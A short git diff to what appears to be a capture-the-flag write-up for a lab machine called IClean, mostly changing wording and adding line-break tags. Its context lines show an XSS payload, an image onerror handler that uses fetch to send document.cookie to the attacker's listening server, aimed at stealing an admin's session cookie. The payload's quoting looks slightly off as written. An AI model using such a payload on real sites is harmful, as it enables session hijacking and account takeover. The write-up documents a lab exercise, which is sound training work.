@@ -121,7 +121,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 <br />
 
-We have an XSS so to take advantage of it we built a payload with fetch to try to steal the cookies from some admin who is behind the web loading our malicious code and SURPRISE!:
+We have an XSS so to take advantage of it we built a payload with fetch to try to steal the cookies from some admin who is behind the web loading our malicious code:
 
 Payload -> \<img src=x onerror=fetch("http://10.10.14.13/+document.cookie")\>\</img\>
 
@@ -160,4 +160,9 @@ Once we have discovered this path, we set the cookies and access it, managing to
 <br />
 
 ![7](../../../assets/images/IClean/7.png)
+
+<br />
+
 ![8](../../../assets/images/IClean/8.png)
+
+<br />
